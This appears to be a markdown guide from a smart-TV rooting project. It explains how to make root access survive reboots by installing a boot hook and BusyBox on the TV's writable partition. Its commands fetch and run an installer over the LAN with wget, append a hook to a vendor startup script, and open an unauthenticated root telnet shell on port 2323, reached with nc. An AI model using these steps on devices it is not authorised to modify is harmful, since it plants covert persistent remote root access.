# Persistent root

Status: **VERIFIED on hardware** (root after a cold boot with the USB removed).
The redacted capture is in
[evidence/persistence/output.txt](../../evidence/persistence/output.txt).

The hook lives on the writable `apdat` partition. It does not modify the
read-only rootfs or the bootloader.

## Start from the USB root shell

Complete [USB autoroot](usb-autoroot.md) first. You need `/tmp/busybox` to be
present; it is the binary that the USB payload is already running from.

## Option A: pull the installer over LAN

On your workstation, from the repository root:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

In the TV root shell:

```sh
/tmp/busybox wget -O /tmp/persist_root.sh http://<WORKSTATION_IP>:8000/payloads/persist_root.sh
/bin/sh /tmp/persist_root.sh
```

## Option B: paste the installer

Open [`payloads/persist_root.sh`](../../payloads/persist_root.sh), copy the whole
file, and paste it into the root shell. It is POSIX `sh` and writes its own
`root_boot.sh` with a here-document.

## What the installer writes

```text
/mtd_rwarea/apdat/busybox              static armhf BusyBox
/mtd_rwarea/apdat/root_boot.sh         boot script
/mtd_rwarea/apdat/customer_env.sh      vendor hook + one appended line
/mtd_rwarea/apdat/customer_env.sh.bak  backup if the file already existed
```

It runs `restorecon` on the three files so they keep the `idtv_data_t` label.

The appended line is:

```sh
[ -f /mtd_rwarea/apdat/root_boot.sh ] && /bin/sh /mtd_rwarea/apdat/root_boot.sh &
```

## Test without rebooting

```sh
/bin/sh /mtd_rwarea/apdat/root_boot.sh
cat /mtd_rwarea/apdat/root_boot.log
cat /mtd_rwarea/apdat/root_boot.ready
```

Expected: `port 2323 already listening` (the USB telnetd is still running) and a
`READY` file. If the log says `copy busybox failed`, the SELinux label or the
`apdat` mount is wrong; do not reboot until you fix it. The USB stick is still
your recovery path.

## Prove persistence

1. Remove the USB stick.
2. Unplug AC for 10 seconds.
3. Plug in and wait ~20 seconds.
4. Connect:

```bash
nc <TV_IP> 2323
id
```

Expected: `uid=0(root) ... initrc_t` without the stick.

The hook waits for `/tmp/ntkdriver_completed`, then 5 seconds, then applies the
firewall rule. The 20-second wait is conservative.

## Diagnose a failed boot

If the port does not come up, reinsert the USB autoroot stick, regain root, and
read:

```sh
cat /mtd_rwarea/apdat/root_boot.log
cat /mtd_rwarea/apdat/root_boot.ready.failed
ls -l /mtd_rwarea/apdat
```

The TV still boots normally if the hook fails; the hook is a background script,
not an init replacement.

## Remove persistence

```sh
sed -i '/root_boot.sh/d' /mtd_rwarea/apdat/customer_env.sh
rm -f /mtd_rwarea/apdat/root_boot.sh /mtd_rwarea/apdat/busybox \
      /mtd_rwarea/apdat/root_boot.log /mtd_rwarea/apdat/root_boot.ready \
      /mtd_rwarea/apdat/root_boot.ready.failed
```

Cold boot. If `customer_env.sh` was created only by this project, you can remove
it too; if it existed before, keep the rest of its content and only delete the
hook line. See [restore to stock](restore-to-stock.md).
